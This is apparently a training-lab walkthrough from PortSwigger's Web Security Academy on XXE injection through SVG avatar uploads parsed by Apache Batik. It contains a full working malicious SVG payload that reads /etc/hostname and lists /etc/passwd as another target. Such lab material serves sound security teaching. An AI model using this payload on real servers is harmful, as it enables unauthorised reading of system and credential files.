## Exploiting XXE via image file upload

**Category:** xxe
**Difficulty:** Medium

### Description
This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files.

### Solution Steps
1. Find the comment functionality that allows avatar image uploads
2. Note that the server processes uploaded images with Apache Batik (SVG library)
3. SVG files are XML-based, making them potential XXE vectors
4. Create a malicious SVG file containing an XXE payload
5. The SVG should define an external entity that reads a local file
6. Craft the payload:
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```
7. Upload the malicious SVG as your avatar
8. The Batik library parses the XML and resolves the external entity
9. The file contents (/etc/hostname) are rendered in the SVG text element
10. View the processed avatar image to see the exfiltrated data

### Key Payloads
- `/etc/hostname`
- `<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>`
- `file:///etc/passwd`
- `Content-Type: image/svg+xml`

### Indicators of Success
- SVG file uploads without error
- Processed image contains file contents as text
- /etc/hostname or other file data visible in avatar
- External entity resolution confirmed

---
*Source: PortSwigger Web Security Academy*
